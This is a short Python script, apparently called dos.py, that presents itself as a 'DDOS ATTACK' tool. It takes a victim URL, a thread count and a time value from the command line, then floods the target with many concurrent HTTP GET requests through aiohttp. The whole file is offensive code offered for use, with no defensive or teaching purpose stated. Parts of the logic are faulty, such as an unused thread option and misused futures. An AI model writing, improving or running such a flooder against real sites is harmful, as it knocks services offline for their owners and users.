import argparse as parser
import asyncio
import aiohttp
import os

os.system('cls' if os.name == 'nt' else 'clear')

def banner():
	print("DDOS ATTACK")

banner()

def main():
	parse = parser.ArgumentParser(description="Copyright : Pham Chien")
	parse.add_argument('--url', type=str, help='Update New Victim URL')
	parse.add_argument('--thread', type=int, help='Update New thread Session ATtACK')
	parse.add_argument('--time', type=int, help='Update New The TIme Attack')

	args = parse.parse_args()

	your_url = args.url
	your_thread = args.thread
	your_time = args.time

	if your_url:
		if your_thread:
			if your_time:
				URL = str('{}'.format(your_url))

				print('''
TOTAL URL : {}
TOTAL THREAD : {}
TOTAL TIME : {}

[info] CTRL + C To Stop DDoS ATTACK
[info] Started Attack...'''.format(URL, your_thread, your_time))

				async def send_attack(session):
					async with session.get(URL) as response:
						return response.text()

				async def mains():
					NUM = int(your_time)

					threads = []
					async with aiohttp.ClientSession() as session:
						for i in range(NUM):
							t = asyncio.ensure_future(send_attack(session))
							threads.append(t)

						await asyncio.gather(*threads * NUM)
						await asyncio.gather(*threads * NUM)
						await asyncio.gather(*threads * NUM)


				if __name__ == '__main__':
					loopenda = asyncio.get_event_loop()
					loopenda.run_until_complete(mains())
				print("[info] Attack Completed...")


	else:
		print("Usage : python3 dos.py -h to helping")

if __name__ == '__main__':
	main()
